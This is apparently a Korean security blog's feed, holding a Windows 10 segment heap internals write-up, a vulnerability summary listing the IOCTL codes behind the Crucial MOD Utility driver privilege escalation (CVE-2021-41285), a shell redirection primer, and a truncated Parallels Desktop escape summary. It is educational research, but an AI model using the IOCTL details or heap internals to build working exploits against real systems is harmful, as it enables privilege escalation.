&#xAE30;&#xD0C0; &#xC815;&#xBCF4;&#xC5D0; &#xB300;&#xD55C; &#xD544;&#xB4DC;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs c"><span class="hljs-number">0</span>:<span class="hljs-number">017</span>&gt; dt ntdll!_HEAP_VS_CONTEXT   +<span class="hljs-number">0x000</span> Lock             : Uint8B   +<span class="hljs-number">0x008</span> LockType         : _RTLP_HP_LOCK_TYPE   +<span class="hljs-number">0x010</span> FreeChunkTree    : _RTL_RB_TREE   +<span class="hljs-number">0x020</span> SubsegmentList   : _LIST_ENTRY   +<span class="hljs-number">0x030</span> TotalCommittedUnits : Uint8B   +<span class="hljs-number">0x038</span> FreeCommittedUnits : Uint8B   +<span class="hljs-number">0x040</span> DelayFreeContext : _HEAP_VS_DELAY_FREE_CONTEXT   +<span class="hljs-number">0x080</span> BackendCtx       : Ptr64 Void   +<span class="hljs-number">0x088</span> Callbacks        : _HEAP_SUBALLOCATOR_CALLBACKS   +<span class="hljs-number">0x0b0</span> Config           : _RTL_HP_VS_CONFIG   +<span class="hljs-number">0x0b4</span> Flags            : Uint4B</code></pre><ul><li><code>FreeChunkTree</code> : free &#xB41C; VS &#xBE14;&#xB85D;&#xC758; RB tree</li><li><code>SubsegmentList</code> : &#xBAA8;&#xB4E0; VS subsegement&#xC758; linked list</li><li><code>BackendCt</code> : &#xC0C1;&#xC704; <code>_SEGMENT_HEAP</code> &#xC5D0; &#xB300;&#xD55C; &#xD3EC;&#xC778;&#xD130;</li><li><code>Callbacks</code> : VS subsegment &#xAD00;&#xB9AC;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xC778;&#xCF54;&#xB529;&#xB41C; &#xCF5C;&#xBC31;</li></ul><h2 id="HEAP-VS-SUBSEGMENT"><a href="#HEAP-VS-SUBSEGMENT" class="headerlink" title="_HEAP_VS_SUBSEGMENT"></a>_HEAP_VS_SUBSEGMENT</h2><p>VS subsegment&#xB294; VS &#xBE14;&#xB85D;&#xC774; &#xD560;&#xB2F9;&#xB418;&#xB294; &#xC704;&#xCE58;&#xC785;&#xB2C8;&#xB2E4;. VS subsegment&#xB294; <code>RtlpHpVsSubsegmentCreate()</code>&#xB97C; &#xD1B5;&#xD574; &#xD560;&#xB2F9; &#xBC0F; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xBA70;  <code>_HEAP_VS_SUBSEGMENT</code> &#xD5E4;&#xB354;&#xB97C; &#xAC16;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">0</span>:<span class="hljs-number">014</span>&gt; dt ntdll!_HEAP_VS_SUBSEGMENT   +<span class="hljs-number">0x000</span> ListEntry        : _LIST_ENTRY   +<span class="hljs-number">0x010</span> CommitBitmap     : Uint8B   +<span class="hljs-number">0x018</span> CommitLock       : Uint8B   +<span class="hljs-number">0x020</span> Size             : Uint2B   +<span class="hljs-number">0x022</span> Signature        : Pos <span class="hljs-number">0</span>, <span class="hljs-number">15</span> Bits   +<span class="hljs-number">0x022</span> FullCommit       : Pos <span class="hljs-number">15</span>, <span class="hljs-number">1</span> Bit</code></pre><ul><li><code>ListEntry</code> : &#xAC01; VS subsegment&#xB294; VS subsegment Linked List&#xC758; &#xB178;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</li><li><code>CommitBitmap</code> : VS subsegment &#xD398;&#xC774;&#xC9C0;&#xC758; &#xCEE4;&#xBC0B; &#xBE44;&#xD2B8;&#xB9F5;</li><li><code>Size</code> : 16bytes &#xBE14;&#xB85D;&#xC758; VS &#xD558;&#xC704; &#xC138;&#xADF8;&#xBA3C;&#xD2B8; &#xD06C;&#xAE30;</li><li><code>Signature</code> : VS subsegemnt&#xAC00; &#xC190;&#xC0C1;&#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;(<code>Size  ^ 0xABED</code>)</li></ul><h2 id="HEAP-VS-CHUNK-HEADER"><a href="#HEAP-VS-CHUNK-HEADER" class="headerlink" title="_HEAP_VS_CHUNK_HEADER"></a>_HEAP_VS_CHUNK_HEADER</h2><p>&#xC0AC;&#xC6A9; &#xC911;&#xC778; VS &#xBE14;&#xB85D;&#xC5D0;&#xB294; 16 bytes &#xD06C;&#xAE30;&#xC758; &#xD5E4;&#xB354;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">0</span>:<span class="hljs-number">014</span>&gt; dt ntdll!_HEAP_VS_CHUNK_HEADER -r   +<span class="hljs-number">0x000</span> Sizes            : _HEAP_VS_CHUNK_HEADER_SIZE      +<span class="hljs-number">0x000</span> MemoryCost       : Pos <span class="hljs-number">0</span>, <span class="hljs-number">16</span> Bits      +<span class="hljs-number">0x000</span> UnsafeSize       : Pos <span class="hljs-number">16</span>, <span class="hljs-number">16</span> Bits      +<span class="hljs-number">0x004</span> UnsafePrevSize   : Pos <span class="hljs-number">0</span>, <span class="hljs-number">16</span> Bits      +<span class="hljs-number">0x004</span> Allocated        : Pos <span class="hljs-number">16</span>, <span class="hljs-number">8</span> Bits      +<span class="hljs-number">0x000</span> KeyUShort        : Uint2B      +<span class="hljs-number">0x000</span> KeyULong         : Uint4B      +<span class="hljs-number">0x000</span> HeaderBits       : Uint8B   +<span class="hljs-number">0x008</span> EncodedSegmentPageOffset : Pos <span class="hljs-number">0</span>, <span class="hljs-number">8</span> Bits   +<span class="hljs-number">0x008</span> UnusedBytes      : Pos <span class="hljs-number">8</span>, <span class="hljs-number">1</span> Bit   +<span class="hljs-number">0x008</span> SkipDuringWalk   : Pos <span class="hljs-number">9</span>, <span class="hljs-number">1</span> Bit   +<span class="hljs-number">0x008</span> Spare            : Pos <span class="hljs-number">10</span>, <span class="hljs-number">22</span> Bits   +<span class="hljs-number">0x008</span> AllocatedChunkBits : Uint4B</code></pre><ul><li><code>Size</code> : &#xD06C;&#xAE30; &#xBC0F; &#xC0C1;&#xD0DC; &#xC815;&#xBCF4;&#xB97C; &#xCEA1;&#xC290;&#xD654;&#xD558;&#xB294; &#xC778;&#xCF54;&#xB529; &#xB41C; QWORD &#xD06C;&#xAE30;&#xC758; &#xD558;&#xC704; &#xAD6C;&#xC870;&#xCCB4;</li><li><code>EncodedSegmentPageOffset</code> : &#xD398;&#xC774;&#xC9C0;&#xC758; VS subsegment &#xC2DC;&#xC791;&#xBD80;&#xD130; &#xBE14;&#xB85D;&#xAE4C;&#xC9C0;&#xC758; &#xC624;&#xD504;&#xC14B;(&#xC778;&#xCF54;&#xB529; &#xB428;)</li><li><code>UnusedBytes</code> :  &#xC0AC;&#xC6A9;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xD06C;&#xAE30; &#xD50C;&#xB798;&#xADF8;</li></ul><h2 id="HEAP-VS-CHUNK-FREE-HEADER"><a href="#HEAP-VS-CHUNK-FREE-HEADER" class="headerlink" title="_HEAP_VS_CHUNK_FREE_HEADER"></a>_HEAP_VS_CHUNK_FREE_HEADER</h2><p>free &#xB41C; VS &#xBE14;&#xB85D;&#xC5D0;&#xB294; 32 bytes (0x20) &#xD5E4;&#xB354;&#xAC00; &#xC788;&#xC73C;&#xBA70; &#xCC98;&#xC74C; 8 bytes&#xB294; &#xC55E;&#xC11C; &#xBCF8;<code>_HEAP_VS_CHUNK_HEADER</code> &#xAD6C;&#xC870;&#xCCB4;&#xC640; &#xB3D9;&#xC77C;&#xD569;&#xB2C8;&#xB2E4;. &#xC624;&#xD504;&#xC14B; 0x08&#xC5D0;&#xC11C; &#xC2DC;&#xC791;&#xD558;&#xB294; &#xB178;&#xB4DC; &#xD544;&#xB4DC;&#xB294; <code>VsContext.FreeChunkTree</code> &#xC5D0;&#xC11C; free &#xB41C; VS &#xBE14;&#xB85D; &#xB178;&#xB4DC; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">0</span>:<span class="hljs-number">014</span>&gt; dt ntdll!_HEAP_VS_CHUNK_FREE_HEADER -r   +<span class="hljs-number">0x000</span> Header           : _HEAP_VS_CHUNK_HEADER      +<span class="hljs-number">0x000</span> Sizes            : _HEAP_VS_CHUNK_HEADER_SIZE         +<span class="hljs-number">0x000</span> MemoryCost       : Pos <span class="hljs-number">0</span>, <span class="hljs-number">16</span> Bits         +<span class="hljs-number">0x000</span> UnsafeSize       : Pos <span class="hljs-number">16</span>, <span class="hljs-number">16</span> Bits         +<span class="hljs-number">0x004</span> UnsafePrevSize   : Pos <span class="hljs-number">0</span>, <span class="hljs-number">16</span> Bits         +<span class="hljs-number">0x004</span> Allocated        : Pos <span class="hljs-number">16</span>, <span class="hljs-number">8</span> Bits         +<span class="hljs-number">0x000</span> KeyUShort        : Uint2B         +<span class="hljs-number">0x000</span> KeyULong         : Uint4B         +<span class="hljs-number">0x000</span> HeaderBits       : Uint8B      +<span class="hljs-number">0x008</span> EncodedSegmentPageOffset : Pos <span class="hljs-number">0</span>, <span class="hljs-number">8</span> Bits      +<span class="hljs-number">0x008</span> UnusedBytes      : Pos <span class="hljs-number">8</span>, <span class="hljs-number">1</span> Bit      +<span class="hljs-number">0x008</span> SkipDuringWalk   : Pos <span class="hljs-number">9</span>, <span class="hljs-number">1</span> Bit      +<span class="hljs-number">0x008</span> Spare            : Pos <span class="hljs-number">10</span>, <span class="hljs-number">22</span> Bits      +<span class="hljs-number">0x008</span> AllocatedChunkBits : Uint4B   +<span class="hljs-number">0x000</span> OverlapsHeader   : Uint8B   +<span class="hljs-number">0x008</span> Node             : _RTL_BALANCED_NODE...</code></pre><p>&#xC815;&#xB9AC;&#xD560;&#xAC8C; &#xB108;&#xBB34; &#xB9CE;&#xC544;&#xC11C; &#xBC8C;&#xC368;&#xBD80;&#xD130; &#xC5B4;&#xC9C8;&#xC5B4;&#xC9C8;&#xD558;&#xB124;&#xC694;.. &#xC544; &#xBC31;&#xC2E0; &#xB54C;&#xBB38;&#xC778;&#xAC00;? &#xADF8;&#xB798;&#xB3C4; &#xBB38;&#xC81C;&#xB97C; &#xD480;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xAF2D; &#xC54C;&#xACE0; &#xB118;&#xC5B4;&#xAC00;&#xC57C; &#xD558;&#xB294; &#xBD80;&#xBD84;&#xC774;&#xB77C; &#xC5F4;&#xC2EC;&#xD788; &#xC815;&#xB9AC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4; &#x3160;&#x3160;</p><p>&#xB2E4;&#xC74C; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; LFH&#xC640; Large Block&#xAE4C;&#xC9C0; &#xC0B4;&#xD3B4;&#xBCF4;&#xACE0; &#xC5EC;&#xC720;&#xAC00; &#xB41C;&#xB2E4;&#xBA74; CTF&#xC5D0; &#xCD9C;&#xC81C;&#xB41C; Segment Heap &#xBB38;&#xC81C;&#xB97C; &#xC2AC;&#xCA4D; &#xC2A4;&#xD3EC; &#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD560;&#xAC8C;&#xC694;!</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Yason-Windows-10-Segment-Heap-Internals-wp.pdf">https://www.blackhat.com/docs/us-16/materials/us-16-Yason-Windows-10-Segment-Heap-Internals-wp.pdf</a></p><p><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Yason-Windows-10-Segment-Heap-Internals.pdf">https://www.blackhat.com/docs/us-16/materials/us-16-Yason-Windows-10-Segment-Heap-Internals.pdf</a></p><p><a href="https://speakerdeck.com/scwuaptx/windows-kernel-heap-segment-heap-in-windows-kernel-part-1?slide=207">https://speakerdeck.com/scwuaptx/windows-kernel-heap-segment-heap-in-windows-kernel-part-1?slide=207</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/heap/">heap</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/research/">research</category>
      
      <category domain="https://hackyboiz.github.io/tags/segment-heap/">segment heap</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows-10/">windows 10</category>
      
      
      <comments>https://hackyboiz.github.io/2021/10/10/l0ch/segment-heap-part2/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Crucial’s MOD Utility LPE – CVE-2021-41285</title>
      <link>https://hackyboiz.github.io/2021/10/09/j0ker/2021-10-09/</link>
      <guid>https://hackyboiz.github.io/2021/10/09/j0ker/2021-10-09/</guid>
      <pubDate>Sat, 09 Oct 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://voidsec.com/crucial-mod-utility-lpe-cve-2021-4128</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://voidsec.com/crucial-mod-utility-lpe-cve-2021-41285/">https://voidsec.com/crucial-mod-utility-lpe-cve-2021-41285/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Crucial Ballistix MOD Utility</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Crucial Ballistix MOD Utility&#xC758; <code>MODAPI.sys</code>&#xC5D0;&#xC11C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xC774; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xACF5;&#xAC1C;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xC740; &#xBAA8;&#xB450; IOCTL &#xC694;&#xCCAD;&#xC744; &#xD1B5;&#xD574; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>IO bus&#xC5D0; &#xB370;&#xC774;&#xD130; &#xB370;&#xC774;&#xD130; &#xC4F0;&#xAE30; &#xD639;&#xC740; &#xC77D;&#xC5B4;&#xC624;&#xAE30;<ul><li><code>0x9C406144: HalGetBusDataByOffset</code></li><li><code>0x9C40A148: HalSetBusDataByOffset</code></li><li>IO bus&#xC5D0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC368;&#xC11C; PCI &#xC124;&#xC815; &#xC815;&#xBCF4; &#xD639;&#xC740; &#xBCA4;&#xB354;&#xC758; &#xB370;&#xC774;&#xD130; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB4E4;&#xC744; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li><li>IO port&#xC5D0;&#xC11C; 1/2/4 &#xBC14;&#xC774;&#xD2B8; &#xC77D;&#xAE30; &#xD639;&#xC740; &#xC4F0;&#xAE30;<ul><li><code>0x9C40A0C8, 0x9C40A0D8 __outbyte, 0x9C40A0DC __outword, 0x9C40A0E0 __outdword</code></li><li><code>0x9C4060C4, 0x9C4060CC __inbyte, 0x9C4060D0 __inword, 0x9C4060D4 __indword</code></li><li>HDD&#xC640; GPU &#xB4F1; &#xB514;&#xBC14;&#xC774;&#xC2A4;&#xB4E4;&#xACFC; &#xC9C1;&#xC811;&#xC801;&#xC73C;&#xB85C; &#xD1B5;&#xC2E0;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xB514;&#xC2A4;&#xD06C;&#xC5D0; &#xC9C1;&#xC811; &#xC4F0;&#xACE0; &#xC77D;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li><li>&#xC784;&#xC758; &#xBB3C;&#xB9AC;&#xC8FC;&#xC18C; &#xD560;&#xB2F9; &#xBC0F; &#xC720;&#xC800; &#xACF5;&#xAC04;&#xACFC; &#xB9E4;&#xD551;<ul><li><code>0x9C406104: MmMapIoSpace</code></li><li>&#xB7A8;&#xC5D0; &#xC788;&#xB294; &#xBB3C;&#xB9AC;&#xC8FC;&#xC18C;&#xB97C; &#xC720;&#xC800; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBA54;&#xBAA8;&#xB9AC;&#xB85C; &#xB9E4;&#xD551;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xBC14;&#xB85C; &#xC815;&#xBCF4;&#xB97C; &#xCD94;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li><li>MSR &#xC4F0;&#xAE30;<ul><li>Model-Specific Registers(MSRs)&#xB294; &#xC8FC;&#xB85C; CPU &#xC815;&#xBCF4;&#xB97C; &#xAC00;&#xC838;&#xC624;&#xB294;&#xB370; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xC911; <code>MSR _LSTAR</code>&#xC740; &#xC720;&#xC800;&#xBAA8;&#xB4DC;&#xC5D0;&#xC11C; &#xCEE4;&#xB110;&#xBAA8;&#xB4DC;&#xB85C; &#xC804;&#xD658;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xB418;&#xB294;&#xB370;, &#xC774; &#xB54C; <code>MSR _LSTAR</code> &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xC77D;&#xACE0; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xB85C; call &#xD569;&#xB2C8;&#xB2E4;. <code>MSR _LSTAR</code>&#xB97C; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xBA74; &#xC2E4;&#xD589; &#xD750;&#xB984;&#xC744; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li><code>0x9C402084: __readmsr</code></li><li><code>0x9C402088: __writemsr</code></li><li>MSR&#xC744; &#xC77D;&#xACE0; &#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li></ol>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/eop/">eop</category>
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/driver/">driver</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve-2021-41285/">cve-2021-41285</category>
      
      <category domain="https://hackyboiz.github.io/tags/ioctl/">ioctl</category>
      
      <category domain="https://hackyboiz.github.io/tags/3rd-party-driver/">3rd party driver</category>
      
      <category domain="https://hackyboiz.github.io/tags/arbitrary-read-write/">arbitrary read write</category>
      
      
      <comments>https://hackyboiz.github.io/2021/10/09/j0ker/2021-10-09/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[해키피디아] Redirection</title>
      <link>https://hackyboiz.github.io/2021/10/08/poosic/redirection/</link>
      <guid>https://hackyboiz.github.io/2021/10/08/poosic/redirection/</guid>
      <pubDate>Fri, 08 Oct 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xB9AC;&amp;#xB2E4;&amp;#xC774;&amp;#xB809;&amp;#xC158;&amp;#xC740; &amp;#xB300;&amp;#xBD80;&amp;#xBD84;&amp;#xC758; CLI(Command Line Interpreter)&amp;#xC5D0;&amp;#xC11C; &amp;#xC0AC;&amp;</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xB9AC;&#xB2E4;&#xC774;&#xB809;&#xC158;&#xC740; &#xB300;&#xBD80;&#xBD84;&#xC758; CLI(Command Line Interpreter)&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xC77C;&#xBC18;&#xC801;&#xC778; &#xBA85;&#xB839;&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xBA85;&#xB839;&#xC5B4;&#xB294; &#xD45C;&#xC900; &#xC785;&#xCD9C;&#xB825;&#xC5D0; &#xB300;&#xD55C; &#xBC29;&#xD5A5;&#xC744; &#xBC14;&#xAFD4; &#xD30C;&#xC77C;&#xB85C; &#xC785;&#xB825;&#xC744; &#xBC1B;&#xAC70;&#xB098; &#xD30C;&#xC77C;&#xB85C; &#xCD9C;&#xB825;&#xC744; &#xD558;&#xB3C4;&#xB85D; &#xBCC0;&#xACBD;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="&#xBA85;&#xB839;&#xC5B4;"><a href="#&#xBA85;&#xB839;&#xC5B4;" class="headerlink" title="&#xBA85;&#xB839;&#xC5B4;"></a>&#xBA85;&#xB839;&#xC5B4;</h3><pre><code class="hljs bash">&#xBA85;&#xB839;&#xC5B4;1 &gt; &#xD30C;&#xC77C;&#xBA85;&#xB839;&#xC5B4;1 &gt;&gt; &#xD30C;&#xC77C;&#xBA85;&#xB839;&#xC5B4;1 &lt; &#xD30C;&#xC77C;</code></pre><p><code>&gt;</code>&#xB294; &#xD45C;&#xC900; &#xCD9C;&#xB825; &#xC7AC;&#xC9C0;&#xC815; &#xBA85;&#xB839;&#xC5B4;&#xB85C;&#xC368;, &#xBA85;&#xB839;&#xC5B4;&#xC758; &#xC2E4;&#xD589; &#xACB0;&#xACFC;&#xB97C; &#xD45C;&#xC900; &#xCD9C;&#xB825;&#xC774; &#xC544;&#xB2CC; &#xC7AC;&#xC9C0;&#xC815;&#xD55C; &#xACF3;&#xC73C;&#xB85C; &#xBCF4;&#xB0B4; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. <code>&gt;&gt;</code>&#xB294; &#xB611;&#xAC19;&#xC740; &#xD45C;&#xC900; &#xCD9C;&#xB825; &#xC7AC;&#xC9C0;&#xC815; &#xBA85;&#xB839;&#xC5B4;&#xC9C0;&#xB9CC;, &#xC2E4;&#xD589; &#xACB0;&#xACFC;&#xB97C; &#xC7AC;&#xC9C0;&#xC815;&#xD55C; &#xD30C;&#xC77C;&#xC758; &#xB4A4;&#xCABD;&#xC5D0; &#xC774;&#xC5B4;&#xC11C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>&lt;</code>&#xB294; &#xC774;&#xC640; &#xBC18;&#xB300;&#xB85C; &#xD45C;&#xC900; &#xC785;&#xB825; &#xC7AC;&#xC9C0;&#xC815; &#xBA85;&#xB839;&#xC5B4;&#xC785;&#xB2C8;&#xB2E4;. &#xBA85;&#xB839;&#xC5B4;&#xC758; &#xC785;&#xB825;&#xC73C;&#xB85C;&#xC368; &#xD45C;&#xC900; &#xC785;&#xB825;&#xACFC; &#xC5F0;&#xACB0;&#xB41C; &#xD0A4;&#xBCF4;&#xB4DC; &#xB300;&#xC2E0; &#xC7AC;&#xC9C0;&#xC815;&#xD55C; &#xACF3;&#xC744; &#xC785;&#xB825;&#xC73C;&#xB85C; &#xBC1B;&#xC544; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC544;&#xB798; &#xC2E4;&#xC81C; &#xC0AC;&#xC6A9; &#xC608;&#xC2DC;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/10/08/poosic/redirection/image1.png" alt></p><p> cat &#xBA85;&#xB839;&#xC5B4;&#xC640; &#xD14D;&#xC2A4;&#xD2B8; &#xD30C;&#xC77C;&#xB85C; &#xAD6C;&#xD604;&#xD55C; &#xAC04;&#xB2E8;&#xD55C; &#xB9AC;&#xB2E4;&#xC774;&#xB809;&#xC158;&#xC758; &#xC608;&#xC2DC;&#xC785;&#xB2C8;&#xB2E4;. cat &#xBA85;&#xB839;&#xC5B4;&#xB85C; &#xD45C;&#xC900; &#xCD9C;&#xB825;&#xC744; &#xD1B5;&#xD574; &#xD654;&#xBA74;&#xC5D0; &#xCD9C;&#xB825;&#xB418;&#xB358; &#x201C;We are Hackyboiz!&#x201D;&#xB77C;&#xB294; &#xBB38;&#xC7A5;&#xC744; hackyboizt.txt&#xB85C; &#xB9AC;&#xB2E4;&#xC774;&#xB809;&#xC158;&#xC2DC;&#xCF1C; &#xCD9C;&#xB825; &#xACB0;&#xACFC;&#xB97C; &#xC800;&#xC7A5;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xB2E4;&#xC2DC; hackyboiz.txt &#xD30C;&#xC77C;&#xC744; &#xB9AC;&#xB2E4;&#xC774;&#xB809;&#xC158;&#xC2DC;&#xCF1C; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC744; &#xC785;&#xB825;&#xC73C;&#xB85C; &#xBC1B;&#xC544; cat &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xCF30;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/10/08/poosic/redirection/image2.png" alt></p><p>&#xC774;&#xD6C4; <code>&gt;&gt;</code> &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xC800;&#xC7A5;&#xB41C; &#x201C;We are Hackyboiz!&#x201D;&#xB77C;&#xB294; &#xBB38;&#xC7A5;&#xC740; &#xC704;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD558;&#xC600;&#xB4EF;&#xC774; &#xD30C;&#xC77C;&#xC758; &#xB4B7; &#xBD80;&#xBD84;&#xC5D0; &#xD45C;&#xC900; &#xCD9C;&#xB825;&#xC758; &#xACB0;&#xACFC;&#xAC00; &#xC774;&#xC5B4;&#xC11C; &#xC800;&#xC7A5;&#xB418;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Hackypedia/">Hackypedia</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/poosic/">poosic</category>
      
      <category domain="https://hackyboiz.github.io/tags/redirection/">redirection</category>
      
      
      <comments>https://hackyboiz.github.io/2021/10/08/poosic/redirection/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-34856: Parallels Desktop에서 발견된 취약점</title>
      <link>https://hackyboiz.github.io/2021/10/07/l0ch/2021-10-07/</link>
      <guid>https://hackyboiz.github.io/2021/10/07/l0ch/2021-10-07/</guid>
      <pubDate>Thu, 07 Oct 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://trenchant.io/pwn2own-2021-parallels-desktop-guest</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://trenchant.io/pwn2own-2021-parallels-desktop-guest-to-host-escape/">PWN2OWN 2021: PARALLELS DESKTOP GUEST TO HOST ESCAPE</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Parallels desktop</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>macOS/Chrome OS&#xC6A9; &#xAC00;&#xC0C1;&#xD654; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC778; Parallels Desktop&#xC5D0;&#xC11C; Guest &#xBA38;&#xC2E0;&#xC5D0;&#xC11C; Host &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; Guest &#xC640; Host &#xAC04; &#xBC18;&#xAC00;&#xC0C1;&#xD654; I/O&#xB97C; &#xC9C0;&#xC6D0;&#xD558;&#xB294; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xC778; VirtIO&#xC758; VGA &#xB514;&#xBC14;&#xC774;&#xC2A4; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xD568;&#xC218; <code>PciVirtIOWriteMM/PciVirtIOReadMM</code> &#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xD568;&#xC218;&#xB4E4;&#xC740; Guest&#xAC00; &#xC81C;&#xC5B4; &#xAC00;&#xB2A5;&#xD55C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC804;&#xC5ED; 